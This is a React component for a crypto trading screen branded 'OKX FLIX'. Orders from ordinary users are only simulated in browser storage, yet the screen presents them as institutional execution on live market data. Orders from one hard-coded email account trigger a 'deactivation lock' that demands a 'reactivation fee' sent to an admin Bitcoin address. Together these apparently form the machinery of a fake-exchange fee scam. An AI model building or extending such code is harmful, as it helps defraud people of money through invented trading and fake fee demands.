'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useApp } from '@/lib/store';
import { CandlestickChart, TrendingUp, TrendingDown, ArrowUpRight, CheckCircle2, AlertTriangle, RefreshCw, ShieldAlert, Wifi, WifiOff, Clock } from 'lucide-react';
import { TradingOrder, CryptoAsset } from '@/types';
import { INITIAL_ASSETS } from '@/lib/mockData';

export const TradingView: React.FC = () => {
  const { user, balances, setBalances, orders, setOrders, addAuditLog, triggerDeactivationLock, setFeeProtocol, adminBtcAddress, setActiveTab, checkAccountActive } = useApp();
  
  const [selectedPair, setSelectedPair] = useState<string>('BTC/USDT');
  const [orderType, setOrderType] = useState<'limit' | 'market' | 'stop' | 'take_profit'>('limit');
  const [side, setSide] = useState<'buy' | 'sell'>('buy');
  const [price, setPrice] = useState<string>('68720.50');
  const [amount, setAmount] = useState<string>('0.5');
  const [isExecuting, setIsExecuting] = useState<boolean>(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [orderError, setOrderError] = useState<string | null>(null);

  const isOwner = user.role === 'owner' || user.email === 'richardshannon901@gmail.com';

  // Real-time connection & data states
  const [connectionStatus, setConnectionStatus] = useState<'connecting' | 'connected' | 'error' | 'disconnected'>('connecting');
  const [assets, setAssets] = useState<CryptoAsset[]>(INITIAL_ASSETS);
  const [dataSource, setDataSource] = useState<string>('CoinGecko API');
  const [lastDataTimeString, setLastDataTimeString] = useState<string>('Connecting...');
  const [isDataFresh, setIsDataFresh] = useState<boolean>(false);
  const [retryCount, setRetryCount] = useState<number>(0);
  const [hasReceivedLiveData, setHasReceivedLiveData] = useState<boolean>(false);
  const [isPolling, setIsPolling] = useState<boolean>(true);

  const STALE_THRESHOLD_MS = 15000;
  const lastTimestampRef = useRef<number>(0);
  const retryTimerRef = useRef<NodeJS.Timeout | null>(null);
  const fetchRef = useRef<() => Promise<void>>(() => Promise.resolve());

  const fetchLiveMarketData = useCallback(async () => {
    try {
      setConnectionStatus(prev => prev === 'connected' ? 'connected' : 'connecting');
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 6000);

      const res = await fetch('/api/market', {
        headers: { 'Accept': 'application/json' },
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!res.ok) {
        throw new Error(`Market data feed returned status ${res.status}`);
      }

      const data = await res.json();

      if (data.assets && Array.isArray(data.assets) && data.assets.length > 0) {
        setAssets(data.assets);
        setDataSource(data.source || 'CoinGecko API');
        setConnectionStatus('connected');
        const now = Date.now();
        lastTimestampRef.current = now;
        setLastDataTimeString(new Date(now).toLocaleTimeString());
        setIsDataFresh(true);
        setHasReceivedLiveData(true);
        setRetryCount(0);

        const currentSymbol = selectedPair.split('/')[0];
        const matched = data.assets.find((a: CryptoAsset) => a.symbol === currentSymbol);
        if (matched && orderType === 'market') {
          setPrice(matched.priceUSD.toString());
        }
      } else {
        throw new Error('Invalid market data payload received');
      }
    } catch (err: any) {
      console.warn('Market data fetch error:', err);
      setConnectionStatus('error');
      
      const backoffDelay = Math.min(1000 * Math.pow(2, retryCount), 30000);
      setRetryCount(prev => prev + 1);

      if (retryTimerRef.current) clearTimeout(retryTimerRef.current);
      retryTimerRef.current = setTimeout(() => {
        if (fetchRef.current) {
          fetchRef.current();
        }
      }, backoffDelay);
    }
  }, [retryCount, selectedPair, orderType]);

  useEffect(() => {
    fetchRef.current = fetchLiveMarketData;
  }, [fetchLiveMarketData]);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (fetchRef.current) {
        fetchRef.current();
      }
    }, 50);

    const interval = setInterval(() => {
      if (isPolling && fetchRef.current) {
        fetchRef.current();
      }
    }, 7000);

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
      if (retryTimerRef.current) clearTimeout(retryTimerRef.current);
    };
  }, [isPolling]);

  useEffect(() => {
    const staleCheckInterval = setInterval(() => {
      if (lastTimestampRef.current > 0) {
        const elapsed = Date.now() - lastTimestampRef.current;
        if (elapsed > STALE_THRESHOLD_MS) {
          setIsDataFresh(false);
          setConnectionStatus('disconnected');
        } else {
          setIsDataFresh(true);
        }
      }
    }, 2000);
    return () => clearInterval(staleCheckInterval);
  }, []);

  const baseSymbol = selectedPair.split('/')[0];
  const activeAsset = assets.find(a => a.symbol === baseSymbol) || assets[0];
  const latestMarketPrice = activeAsset?.priceUSD || 0;

  const isLiveConnected = connectionStatus === 'connected' && hasReceivedLiveData && isDataFresh;

  // Available USDT balance check
  const usdtBalance = balances.find(b => b.assetSymbol === 'USDT')?.available || 0;

  const handleExecuteOrder = (e: React.FormEvent) => {
    e.preventDefault();
    if (!checkAccountActive()) return;
    setOrderError(null);
    setSuccessMessage(null);

    if (!isLiveConnected || latestMarketPrice <= 0) {
      setOrderError('MARKET_DATA_UNAVAILABLE: Cannot execute order. Live market feed is disconnected or stale.');
      addAuditLog('ORDER_REJECTED_STALE_DATA', `Attempted order on ${selectedPair} failed due to stale or disconnected live feed.`, 'WARNING');
      return;
    }

    const executionPrice = orderType === 'market' ? latestMarketPrice : (parseFloat(price) || latestMarketPrice);
    const parsedAmount = parseFloat(amount) || 0.1;
    const orderValue = executionPrice * parsedAmount;
    const tradingFee = orderValue * 0.001;
    const totalAmount = orderValue + tradingFee;

    if (isOwner) {
      // Owner triggers deactivation lock & reactivation fee protocol
      setFeeProtocol({
        isLocked: true,
        step: 1,
        targetAddress: adminBtcAddress,
        feesPaid: {},
        pendingOrder: {
          pair: selectedPair,
          side,
          orderType,
          amount: parsedAmount,
          price: executionPrice,
          orderValue,
          tradingFee,
          totalAmount
        }
      });
      addAuditLog('FEE_VERIFICATION_REQUIRED', `Placed ${side.toUpperCase()} ${orderType.toUpperCase()} order for ${parsedAmount} ${selectedPair}. Intercepted by Fee & Order Verification for transfer reactivation fee.`, 'WARNING');
    } else {
      // Ordinary user: Check sufficient USDT funds
      if (usdtBalance < totalAmount) {
        setOrderError('Insufficient Balance: You don’t have enough USDT available to place this order. Please deposit funds into your account before trading.');
        addAuditLog('ORDER_REJECTED_INSUFFICIENT_FUNDS', `Order of ${totalAmount.toFixed(2)} USDT rejected due to insufficient balance (${usdtBalance.toFixed(2)} USDT available).`, 'WARNING');
        return;
      }

      setIsExecuting(true);
      setTimeout(() => {
        // Deduct USDT & add crypto or execute order
        const updatedBalances = balances.map(b => {
          if (b.assetSymbol === 'USDT') {
            return { ...b, available: b.available - totalAmount, valueUSD: (b.available - totalAmount) };
          }
          if (b.assetSymbol === baseSymbol && side === 'buy') {
            const newAvail = b.available + parsedAmount;
            const priceRatio = b.available > 0 ? b.valueUSD / b.available : executionPrice;
            return { ...b, available: newAvail, valueUSD: newAvail * priceRatio };
          }
          return b;
        });

        setBalances(updatedBalances);
        try {
          localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(updatedBalances));
        } catch (err) {
          console.error(err);
        }

        const newOrder: TradingOrder = {
          id: `ORD-${Math.random().toString(36).substring(2, 8).toUpperCase()}`,
          timestamp: Date.now(),
          pair: selectedPair,
          type: 'spot',
          side,
          orderType,
          price: executionPrice,
          amount: parsedAmount,
          filled: parsedAmount,
          status: 'filled'
        };

        const updatedOrders = [newOrder, ...orders];
        setOrders(updatedOrders);
        try {
          localStorage.setItem(`okxflix_orders_${user.id}`, JSON.stringify(updatedOrders));
        } catch (err) {
          console.error(err);
        }

        setIsExecuting(false);
        setSuccessMessage(`Successfully executed ${side.toUpperCase()} order for ${parsedAmount} ${baseSymbol} at $${executionPrice.toLocaleString()}.`);
        addAuditLog('ORDER_EXECUTED', `User successfully executed ${side} order for ${parsedAmount} ${selectedPair} at $${executionPrice}.`, 'SUCCESS');
      }, 500);
    }
  };

  return (
    <div className="space-y-6 pb-12 animate-fadeIn">
      {/* Top Bar with Live Connection Status */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-xl">
        <div className="flex items-center gap-4">
          <div className="bg-blue-600/20 text-blue-400 p-2.5 rounded-xl font-bold font-mono flex items-center gap-2">
            <span>{selectedPair}</span>
            <span className={`w-2 h-2 rounded-full ${isLiveConnected ? 'bg-emerald-400 animate-pulse' : 'bg-amber-400'}`}></span>
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl font-bold text-white font-mono">
                ${latestMarketPrice ? latestMarketPrice.toLocaleString('en-US', { minimumFractionDigits: 2 }) : 'Loading...'}
              </h1>
              <span className={`text-xs font-mono px-2 py-0.5 rounded ${activeAsset?.change24h >= 0 ? 'text-emerald-400 bg-emerald-500/10' : 'text-rose-400 bg-rose-500/10'}`}>
                {activeAsset?.change24h >= 0 ? '+' : ''}{activeAsset?.change24h?.toFixed(2)}%
              </span>
              <span className="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-mono uppercase font-bold">
                {isLiveConnected ? 'LIVE FEED' : 'RECONNECTING'}
              </span>
            </div>
            <p className="text-[11px] text-slate-400 font-mono">
              Source: {dataSource} • Last Tick: {lastDataTimeString}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {['BTC/USDT', 'ETH/USDT', 'SOL/USDT', 'BNB/USDT'].map(pair => (
            <button
              key={pair}
              onClick={() => {
                setSelectedPair(pair);
                const sym = pair.split('/')[0];
                const found = assets.find(a => a.symbol === sym);
                if (found) setPrice(found.priceUSD.toString());
              }}
              className={`px-3 py-1.5 rounded-xl text-xs font-mono font-semibold transition-colors ${
                selectedPair === pair ? 'bg-blue-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-800'
              }`}
            >
              {pair}
            </button>
          ))}
        </div>
      </div>

      {/* Main Terminal Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Chart & Order Book */}
        <div className="lg:col-span-2 space-y-6">
          {/* Chart Box with True Live State Management */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl relative overflow-hidden">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <CandlestickChart className="w-4 h-4 text-blue-400" />
                Advanced Candlestick Chart (Live Feed Stream)
              </h3>
              <div className="flex items-center gap-2">
                <span className={`text-[10px] px-2 py-0.5 rounded font-mono font-bold flex items-center gap-1 ${isLiveConnected ? 'bg-emerald-500/10 text-emerald-400' : 'bg-amber-500/10 text-amber-400'}`}>
                  <span className={`w-1.5 h-1.5 rounded-full ${isLiveConnected ? 'bg-emerald-400 animate-ping' : 'bg-amber-400'}`}></span>
                  {isLiveConnected ? 'LIVE' : connectionStatus.toUpperCase()}
                </span>
                <span className="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-mono">1H Interval</span>
              </div>
            </div>

            <div className="h-[340px] bg-slate-950 rounded-xl border border-slate-800 flex flex-col items-center justify-center relative overflow-hidden">
              <div className="absolute inset-0 opacity-20 bg-[radial-gradient(#3b82f6_1px,transparent_1px)] [background-size:16px_16px]"></div>

              {/* Blocking Loading / Connection Overlay */}
              {!isLiveConnected && (
                <div className="absolute inset-0 bg-slate-950/90 backdrop-blur-md z-20 flex flex-col items-center justify-center p-6 text-center animate-fadeIn">
                  {connectionStatus === 'error' || connectionStatus === 'disconnected' ? (
                    <div className="space-y-4 max-w-md">
                      <div className="w-12 h-12 rounded-2xl bg-rose-500/20 text-rose-400 flex items-center justify-center mx-auto border border-rose-500/30">
                        <WifiOff className="w-6 h-6 animate-pulse" />
                      </div>
                      <h4 className="text-sm font-bold text-white">Unable to connect to live market data.</h4>
                      <p className="text-xs text-slate-400 font-mono">
                        Connection status: <strong className="text-rose-400 uppercase">{connectionStatus}</strong>. Retrying automatically with exponential backoff (attempt {retryCount})...
                      </p>
                      <button
                        onClick={fetchLiveMarketData}
                        className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-xl text-xs font-bold shadow-lg shadow-blue-600/30 flex items-center gap-2 mx-auto transition-all"
                      >
                        <RefreshCw className="w-3.5 h-3.5" />
                        <span>Retry Connection Now</span>
                      </button>
                    </div>
                  ) : (
                    <div className="space-y-4 max-w-md">
                      <div className="w-12 h-12 rounded-2xl bg-blue-600/20 text-blue-400 flex items-center justify-center mx-auto border border-blue-500/30">
                        <RefreshCw className="w-6 h-6 animate-spin" />
                      </div>
                      <h4 className="text-sm font-bold text-white">OKX FLIX Institutional Trading Engine</h4>
                      <p className="text-xs text-slate-400">
                        Establishing secure connection to real-time market data feed and cryptographic price stream...
                      </p>
                      <span className="text-[10px] text-blue-400 font-mono bg-blue-500/10 px-3 py-1 rounded-full inline-block">
                        Status: Connecting...
                      </span>
                    </div>
                  )}
                </div>
              )}

              {/* Candlestick / Sparkline Visual Content when Connected */}
              <div className="text-center relative z-10 p-6 w-full h-full flex flex-col justify-between">
                <div className="flex items-center justify-between text-xs text-slate-400 font-mono border-b border-slate-800/80 pb-3">
                  <span>Pair: <strong className="text-white">{selectedPair}</strong></span>
                  <span>Live Ask / Bid Spread: <strong className="text-emerald-400">0.02 USD</strong></span>
                  <span>24h Volume: <strong className="text-white">${((activeAsset?.volume24h || 0) / 1e9)?.toFixed(2)}B</strong></span>
                </div>

                {/* SVG Live Sparkline Chart */}
                <div className="my-auto py-4 w-full h-40 flex items-center justify-center relative">
                  <svg className="w-full h-full overflow-visible" viewBox="0 0 300 100" preserveAspectRatio="none">
                    <defs>
                      <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stopColor="#3b82f6" stopOpacity="0.4" />
                        <stop offset="100%" stopColor="#3b82f6" stopOpacity="0.0" />
                      </linearGradient>
                    </defs>
                    {activeAsset?.sparkline && activeAsset.sparkline.length > 1 ? (
                      <>
                        <path
                          d={`M 0 100 ` + activeAsset.sparkline.map((val: number, idx: number, arr: number[]) => {
                            const min = Math.min(...arr);
                            const max = Math.max(...arr);
                            const range = max - min || 1;
                            const x = (idx / (arr.length - 1)) * 300;
                            const y = 90 - ((val - min) / range) * 80;
                            return `L ${x} ${y}`;
                          }).join(' ') + ` L 300 100 Z`}
                          fill="url(#chartGrad)"
                        />
                        <path
                          d={`M ` + activeAsset.sparkline.map((val: number, idx: number, arr: number[]) => {
                            const min = Math.min(...arr);
                            const max = Math.max(...arr);
                            const range = max - min || 1;
                            const x = (idx / (arr.length - 1)) * 300;
                            const y = 90 - ((val - min) / range) * 80;
                            return `${x} ${y}`;
                          }).join(' L ')}
                          fill="none"
                          stroke="#3b82f6"
                          strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </>
                    ) : (
                      <text x="150" y="50" fill="#64748b" fontSize="12" textAnchor="middle">Streaming live tick data...</text>
                    )}
                  </svg>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono border-t border-slate-800/80 pt-3">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Real-Time Feed Active</span>
                  </span>
                  <span>Institutional Execution Mode</span>
                </div>
              </div>
            </div>
          </div>

          {/* Open Orders & History */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <h3 className="text-sm font-bold text-white mb-4">Open Orders & Trade History</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-slate-800 text-slate-400 text-[11px]">
                    <th className="py-2.5 px-3">Order ID</th>
                    <th className="py-2.5 px-3">Pair</th>
                    <th className="py-2.5 px-3">Side</th>
                    <th className="py-2.5 px-3">Type</th>
                    <th className="py-2.5 px-3">Execution Price</th>
                    <th className="py-2.5 px-3">Amount</th>
                    <th className="py-2.5 px-3">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 text-slate-200">
                  {orders.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="py-6 text-center text-slate-500">No active or historical orders found.</td>
                    </tr>
                  ) : (
                    orders.map(o => (
                      <tr key={o.id} className="hover:bg-slate-800/40">
                        <td className="py-3 px-3 text-blue-400">{o.id}</td>
                        <td className="py-3 px-3 font-bold">{o.pair}</td>
                        <td className={`py-3 px-3 uppercase font-bold ${o.side === 'buy' ? 'text-emerald-400' : 'text-rose-400'}`}>{o.side}</td>
                        <td className="py-3 px-3 uppercase text-slate-400">{o.orderType}</td>
                        <td className="py-3 px-3">${o.price.toLocaleString()}</td>
                        <td className="py-3 px-3">{o.amount}</td>
                        <td className="py-3 px-3">
                          <span className={`px-2 py-0.5 rounded text-[10px] ${o.status === 'filled' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-amber-500/10 text-amber-400'}`}>
                            {o.status.toUpperCase()}
                          </span>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* Order Execution Panel */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-base font-bold text-white">Spot / Margin Terminal</h3>
              <span className="text-[10px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded font-mono uppercase font-bold">LIVE ORDER</span>
            </div>

            {successMessage && (
              <div className="mb-4 bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 p-3 rounded-xl text-xs flex items-start gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                <span>{successMessage}</span>
              </div>
            )}

            {orderError && (
              <div className="mb-4 bg-rose-500/15 border border-rose-500/30 text-rose-300 p-3 rounded-xl text-xs flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <span>{orderError}</span>
              </div>
            )}

            {!isLiveConnected && (
              <div className="mb-4 bg-amber-500/15 border border-amber-500/30 text-amber-300 p-3 rounded-xl text-xs flex items-center gap-2 font-mono">
                <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400" />
                <span>WAITING_FOR_MARKET_DATA: Live price feed connecting...</span>
              </div>
            )}

            {/* Buy / Sell Toggle */}
            <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950 p-1 rounded-xl border border-slate-800">
              <button
                type="button"
                onClick={() => setSide('buy')}
                className={`py-2 rounded-lg text-xs font-bold transition-all ${side === 'buy' ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/30' : 'text-slate-400 hover:text-white'}`}
              >
                Buy / Long
              </button>
              <button
                type="button"
                onClick={() => setSide('sell')}
                className={`py-2 rounded-lg text-xs font-bold transition-all ${side === 'sell' ? 'bg-rose-600 text-white shadow-lg shadow-rose-600/30' : 'text-slate-400 hover:text-white'}`}
              >
                Sell / Short
              </button>
            </div>

            {/* Order Type Selector */}
            <div className="grid grid-cols-4 gap-1 mb-4 text-[11px] font-medium">
              {(['limit', 'market', 'stop', 'take_profit'] as const).map(t => (
                <button
                  key={t}
                  type="button"
                  onClick={() => setOrderType(t)}
                  className={`py-1.5 rounded-lg border uppercase transition-colors ${orderType === t ? 'bg-blue-600 border-blue-500 text-white font-bold' : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'}`}
                >
                  {t.replace('_', ' ')}
                </button>
              ))}
            </div>

            <form onSubmit={handleExecuteOrder} className="space-y-4">
              {orderType !== 'market' && (
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1">Order Price (USD)</label>
                  <input
                    type="number"
                    step="0.01"
                    value={price}
                    onChange={(e) => setPrice(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
                    required
                  />
                </div>
              )}

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Amount ({baseSymbol})</label>
                <input
                  type="number"
                  step="0.001"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
                  required
                />
              </div>

              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800 text-[11px] space-y-1.5 font-mono">
                <div className="flex justify-between text-slate-400">
                  <span>Available USDT:</span>
                  <span className="text-white">${usdtBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Live Market Price:</span>
                  <span className="text-emerald-400">${latestMarketPrice ? latestMarketPrice.toLocaleString() : 'Unavailable'}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Estimated Total:</span>
                  <span className="text-white">${((orderType === 'market' ? latestMarketPrice : (parseFloat(price) || latestMarketPrice)) * parseFloat(amount || '0')).toLocaleString(undefined, { maximumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Trading Fee (0.1%):</span>
                  <span className="text-emerald-400">${(((orderType === 'market' ? latestMarketPrice : (parseFloat(price) || latestMarketPrice)) * parseFloat(amount || '0')) * 0.001).toFixed(2)}</span>
                </div>
              </div>

              {orderError && orderError.includes('Insufficient Balance') && (
                <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-3 text-xs space-y-2">
                  <p className="text-amber-300 font-medium">Insufficient Balance</p>
                  <p className="text-slate-400 text-[11px]">You don’t have enough funds available to place this order. Please deposit funds into your account before trading.</p>
                  <button
                    type="button"
                    onClick={() => setActiveTab('wallet')}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded-lg text-xs font-bold transition-all shadow-md"
                  >
                    Deposit Funds
                  </button>
                </div>
              )}

              <button
                type="submit"
                disabled={isExecuting || !isLiveConnected || latestMarketPrice <= 0}
                className={`w-full py-3 rounded-xl text-xs font-bold uppercase tracking-wider text-white shadow-lg transition-all ${
                  !isLiveConnected || latestMarketPrice <= 0
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed'
                    : side === 'buy' 
                      ? 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-600/30' 
                      : 'bg-rose-600 hover:bg-rose-500 shadow-rose-600/30'
                }`}
              >
                {isExecuting ? 'Processing Order...' : !isLiveConnected ? 'Waiting for Live Market Data...' : `Place ${side.toUpperCase()} Order`}
              </button>
            </form>
          </div>

          <div className="mt-6 pt-4 border-t border-slate-800 text-center">
            <p className="text-[10px] text-slate-500 font-mono">
              INSTITUTIONAL ORDER MODE — Executed against validated real-time market data feed.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
